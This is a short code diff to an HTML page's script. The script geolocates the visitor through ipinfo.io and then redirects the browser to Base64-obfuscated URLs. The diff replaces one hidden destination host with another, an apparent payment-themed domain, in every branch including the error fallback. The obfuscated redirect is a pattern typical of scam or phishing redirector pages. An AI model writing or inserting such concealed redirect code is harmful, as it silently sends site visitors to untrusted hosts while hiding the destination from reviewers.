@@ -16,8 +16,8 @@
 
   <script>
     function redirectToPage() {
-      const redirectUrlChina = atob('aHR0cHM6Ly9yZXN0bGVzcy1zbm93LTc1NzIub24uZmxlZWsuY28v'); // Base64 解码
-      const redirectUrlOther = atob('aHR0cHM6Ly9yZXN0bGVzcy1zbm93LTc1NzIub24uZmxlZWsuY28v'); // Base64 解码
+      const redirectUrlChina = atob('aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
+      const redirectUrlOther = atob('aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
       fetch('https://ipinfo.io/json')
         .then(response => {
           if (!response.ok) {
@@ -35,7 +35,7 @@
         })
         .catch(error => {
           console.error(error);
-          window.location.href = atob('aHR0cHM6Ly9yZXN0bGVzcy1zbm93LTc1NzIub24uZmxlZWsuY28v'); // Base64 解码
+          window.location.href = atob('aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
         });
     }
   </script>
